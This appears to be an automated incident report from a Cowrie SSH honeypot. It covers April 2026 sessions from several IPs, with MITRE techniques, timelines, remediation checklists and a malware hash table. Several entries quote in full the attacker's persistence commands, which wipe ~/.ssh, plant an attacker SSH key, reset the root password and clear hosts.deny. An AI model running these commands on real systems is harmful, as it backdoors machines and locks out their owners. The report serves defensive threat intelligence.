| **First Seen** | 2026-04-12 06:24 |
| **Last Seen** | 2026-04-12 06:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:e0TEOL08LJsK"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:24:52` | `cowrie.session.connect` |
| `2026-04-12 06:24:52` | `cowrie.client.version` |
| `2026-04-12 06:24:52` | `cowrie.client.kex` |
| `2026-04-12 06:24:53` | `cowrie.login.success` |
| `2026-04-12 06:24:53` | `cowrie.session.params` |
| `2026-04-12 06:24:53` | `cowrie.command.input` |
| `2026-04-12 06:24:53` | `cowrie.command.failed` |
| `2026-04-12 06:24:53` | `cowrie.log.closed` |
| `2026-04-12 06:24:54` | `cowrie.session.params` |
| `2026-04-12 06:24:54` | `cowrie.command.input` |
| `2026-04-12 06:24:54` | `cowrie.session.file_download` |
| `2026-04-12 06:24:54` | `cowrie.log.closed` |
| `2026-04-12 06:25:02` | `cowrie.session.params` |
| `2026-04-12 06:25:02` | `cowrie.command.input` |
| `2026-04-12 06:25:02` | `cowrie.log.closed` |
| `2026-04-12 06:25:03` | `cowrie.session.params` |
| `2026-04-12 06:25:03` | `cowrie.command.input` |
| `2026-04-12 06:25:03` | `cowrie.log.closed` |
| `2026-04-12 06:25:03` | `cowrie.session.params` |
| `2026-04-12 06:25:03` | `cowrie.command.input` |
| `2026-04-12 06:25:03` | `cowrie.session.file_download` |
| `2026-04-12 06:25:03` | `cowrie.log.closed` |
| `2026-04-12 06:25:04` | `cowrie.session.params` |
| `2026-04-12 06:25:04` | `cowrie.command.input` |
| `2026-04-12 06:25:04` | `cowrie.log.closed` |
| `2026-04-12 06:25:04` | `cowrie.session.params` |
| `2026-04-12 06:25:04` | `cowrie.command.input` |
| `2026-04-12 06:25:05` | `cowrie.log.closed` |
| `2026-04-12 06:25:05` | `cowrie.session.params` |
| `2026-04-12 06:25:05` | `cowrie.command.input` |
| `2026-04-12 06:25:05` | `cowrie.command.input` |
| `2026-04-12 06:25:05` | `cowrie.log.closed` |
| `2026-04-12 06:25:06` | `cowrie.session.params` |
| `2026-04-12 06:25:06` | `cowrie.command.input` |
| `2026-04-12 06:25:06` | `cowrie.log.closed` |
| `2026-04-12 06:25:06` | `cowrie.session.params` |
| `2026-04-12 06:25:06` | `cowrie.command.input` |
| `2026-04-12 06:25:06` | `cowrie.log.closed` |
| `2026-04-12 06:25:07` | `cowrie.session.params` |
| `2026-04-12 06:25:07` | `cowrie.command.input` |
| `2026-04-12 06:25:07` | `cowrie.log.closed` |
| `2026-04-12 06:25:07` | `cowrie.session.params` |
| `2026-04-12 06:25:07` | `cowrie.command.input` |
| `2026-04-12 06:25:07` | `cowrie.log.closed` |
| `2026-04-12 06:25:08` | `cowrie.session.params` |
| `2026-04-12 06:25:08` | `cowrie.command.input` |
| `2026-04-12 06:25:08` | `cowrie.log.closed` |
| `2026-04-12 06:25:09` | `cowrie.session.params` |
| `2026-04-12 06:25:09` | `cowrie.command.input` |
| `2026-04-12 06:25:09` | `cowrie.log.closed` |
| `2026-04-12 06:25:09` | `cowrie.session.params` |
| `2026-04-12 06:25:09` | `cowrie.command.input` |
| `2026-04-12 06:25:09` | `cowrie.log.closed` |
| `2026-04-12 06:25:10` | `cowrie.session.params` |
| `2026-04-12 06:25:10` | `cowrie.command.input` |
| `2026-04-12 06:25:10` | `cowrie.log.closed` |
| `2026-04-12 06:25:10` | `cowrie.session.params` |
| `2026-04-12 06:25:10` | `cowrie.command.input` |
| `2026-04-12 06:25:10` | `cowrie.log.closed` |
| `2026-04-12 06:25:11` | `cowrie.session.params` |
| `2026-04-12 06:25:11` | `cowrie.command.input` |
| `2026-04-12 06:25:11` | `cowrie.log.closed` |
| `2026-04-12 06:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c34a1b774cba

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:25 |
| **Last Seen** | 2026-04-12 06:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:25:28` | `cowrie.session.connect` |
| `2026-04-12 06:25:28` | `cowrie.client.version` |
| `2026-04-12 06:25:28` | `cowrie.client.kex` |
| `2026-04-12 06:25:29` | `cowrie.login.success` |
| `2026-04-12 06:25:29` | `cowrie.session.params` |
| `2026-04-12 06:25:29` | `cowrie.command.input` |
| `2026-04-12 06:25:29` | `cowrie.command.failed` |
| `2026-04-12 06:25:29` | `cowrie.log.closed` |
| `2026-04-12 06:25:30` | `cowrie.session.params` |
| `2026-04-12 06:25:30` | `cowrie.command.input` |
| `2026-04-12 06:25:30` | `cowrie.session.file_download` |
| `2026-04-12 06:25:30` | `cowrie.log.closed` |
| `2026-04-12 06:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8232742f493a

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:25 |
| **Last Seen** | 2026-04-12 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:25:32` | `cowrie.session.connect` |
| `2026-04-12 06:25:32` | `cowrie.client.version` |
| `2026-04-12 06:25:32` | `cowrie.client.kex` |
| `2026-04-12 06:25:33` | `cowrie.login.success` |
| `2026-04-12 06:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f4f2ed84f7b

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-04-12 06:25 |
| **Last Seen** | 2026-04-12 06:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:25:58` | `cowrie.session.connect` |
| `2026-04-12 06:25:58` | `cowrie.client.version` |
| `2026-04-12 06:25:58` | `cowrie.client.kex` |
| `2026-04-12 06:25:59` | `cowrie.login.success` |
| `2026-04-12 06:25:59` | `cowrie.session.params` |
| `2026-04-12 06:25:59` | `cowrie.command.input` |
| `2026-04-12 06:25:59` | `cowrie.command.failed` |
| `2026-04-12 06:25:59` | `cowrie.log.closed` |
| `2026-04-12 06:26:00` | `cowrie.session.params` |
| `2026-04-12 06:26:00` | `cowrie.command.input` |
| `2026-04-12 06:26:00` | `cowrie.session.file_download` |
| `2026-04-12 06:26:00` | `cowrie.log.closed` |
| `2026-04-12 06:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1026aa5fd5e3

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-04-12 06:26 |
| **Last Seen** | 2026-04-12 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:26:06` | `cowrie.session.connect` |
| `2026-04-12 06:26:06` | `cowrie.client.version` |
| `2026-04-12 06:26:06` | `cowrie.client.kex` |
| `2026-04-12 06:26:07` | `cowrie.login.success` |
| `2026-04-12 06:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7857a54f8944

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:27 |
| **Last Seen** | 2026-04-12 06:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:27:26` | `cowrie.session.connect` |
| `2026-04-12 06:27:26` | `cowrie.client.version` |
| `2026-04-12 06:27:26` | `cowrie.client.kex` |
| `2026-04-12 06:27:27` | `cowrie.login.success` |
| `2026-04-12 06:27:27` | `cowrie.session.params` |
| `2026-04-12 06:27:27` | `cowrie.command.input` |
| `2026-04-12 06:27:27` | `cowrie.command.failed` |
| `2026-04-12 06:27:27` | `cowrie.log.closed` |
| `2026-04-12 06:27:28` | `cowrie.session.params` |
| `2026-04-12 06:27:28` | `cowrie.command.input` |
| `2026-04-12 06:27:28` | `cowrie.session.file_download` |
| `2026-04-12 06:27:28` | `cowrie.log.closed` |
| `2026-04-12 06:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-761f73170a83

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:27 |
| **Last Seen** | 2026-04-12 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:27:30` | `cowrie.session.connect` |
| `2026-04-12 06:27:30` | `cowrie.client.version` |
| `2026-04-12 06:27:31` | `cowrie.client.kex` |
| `2026-04-12 06:27:31` | `cowrie.login.success` |
| `2026-04-12 06:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9926b4e22a4

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:31 |
| **Last Seen** | 2026-04-12 06:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:31:21` | `cowrie.session.connect` |
| `2026-04-12 06:31:21` | `cowrie.client.version` |
| `2026-04-12 06:31:21` | `cowrie.client.kex` |
| `2026-04-12 06:31:21` | `cowrie.login.success` |
| `2026-04-12 06:31:22` | `cowrie.session.params` |
| `2026-04-12 06:31:22` | `cowrie.command.input` |
| `2026-04-12 06:31:22` | `cowrie.command.failed` |
| `2026-04-12 06:31:22` | `cowrie.log.closed` |
| `2026-04-12 06:31:22` | `cowrie.session.params` |
| `2026-04-12 06:31:22` | `cowrie.command.input` |
| `2026-04-12 06:31:23` | `cowrie.session.file_download` |
| `2026-04-12 06:31:23` | `cowrie.log.closed` |
| `2026-04-12 06:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd5fe0beb82

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:31 |
| **Last Seen** | 2026-04-12 06:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:31:25` | `cowrie.session.connect` |
| `2026-04-12 06:31:25` | `cowrie.client.version` |
| `2026-04-12 06:31:25` | `cowrie.client.kex` |
| `2026-04-12 06:31:26` | `cowrie.login.success` |
| `2026-04-12 06:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08db573a5e62

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:36 |
| **Last Seen** | 2026-04-12 06:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:36:54` | `cowrie.session.connect` |
| `2026-04-12 06:36:54` | `cowrie.client.version` |
| `2026-04-12 06:36:54` | `cowrie.client.kex` |
| `2026-04-12 06:36:55` | `cowrie.login.success` |
| `2026-04-12 06:36:55` | `cowrie.session.params` |
| `2026-04-12 06:36:55` | `cowrie.command.input` |
| `2026-04-12 06:36:55` | `cowrie.command.failed` |
| `2026-04-12 06:36:55` | `cowrie.log.closed` |
| `2026-04-12 06:36:56` | `cowrie.session.params` |
| `2026-04-12 06:36:56` | `cowrie.command.input` |
| `2026-04-12 06:36:56` | `cowrie.session.file_download` |
| `2026-04-12 06:36:56` | `cowrie.log.closed` |
| `2026-04-12 06:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-678eae96ef34

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:36 |
| **Last Seen** | 2026-04-12 06:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:36:58` | `cowrie.session.connect` |
| `2026-04-12 06:36:58` | `cowrie.client.version` |
| `2026-04-12 06:36:58` | `cowrie.client.kex` |
| `2026-04-12 06:36:59` | `cowrie.login.success` |
| `2026-04-12 06:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `222.71.205[.]34` | **27** | 2026-04-12 06:16 | 2026-04-12 06:36 | 38m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.210.148[.]92` | **24** | 2026-04-12 05:53 | 2026-04-12 06:36 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.153.57[.]103` | **18** | 2026-04-12 05:53 | 2026-04-12 06:04 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.11[.]137` | **9** | 2026-04-12 05:52 | 2026-04-12 06:03 | 18m | 0 | `T1592` | 🟢 LOW |
| `79.45.101[.]239` | **8** | 2026-04-12 05:53 | 2026-04-12 06:03 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.131[.]112` | **2** | 2026-04-12 06:13 | 2026-04-12 06:16 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.186.1[.]59` | 1 | 2026-04-12 06:16 | 2026-04-12 06:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]66` | 1 | 2026-04-12 05:53 | 2026-04-12 05:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.212.12[.]133` | 1 | 2026-04-12 06:34 | 2026-04-12 06:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.77.235[.]89` | 1 | 2026-04-12 06:45 | 2026-04-12 06:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `221.229.220[.]180` | 1 | 2026-04-12 06:16 | 2026-04-12 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.88.103[.]45` | 1 | 2026-04-12 06:14 | 2026-04-12 06:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.225.101[.]76` | 1 | 2026-04-12 05:56 | 2026-04-12 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.240.71[.]234` | 1 | 2026-04-12 05:57 | 2026-04-12 05:57 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
